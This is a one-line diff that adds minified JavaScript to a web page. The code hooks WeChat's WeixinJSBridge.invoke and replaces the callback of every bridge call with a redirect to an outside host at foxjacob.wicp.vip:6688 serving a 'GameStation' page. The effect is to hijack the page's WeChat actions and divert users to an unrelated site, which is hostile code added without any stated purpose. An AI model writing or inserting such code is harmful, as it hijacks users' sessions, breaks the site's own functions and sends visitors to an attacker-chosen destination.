@@ -1,0 +1,1 @@
+document.addEventListener("WeixinJSBridgeReady",function(){if(window.WeixinJSBridge){var a=WeixinJSBridge.invoke;WeixinJSBridge.invoke=function(){arguments[2]=function(){window.location.href="http://foxjacob.wicp.vip:6688/res/plugins/games/GameStation"},a.apply(WeixinJSBridge,arguments)}}});
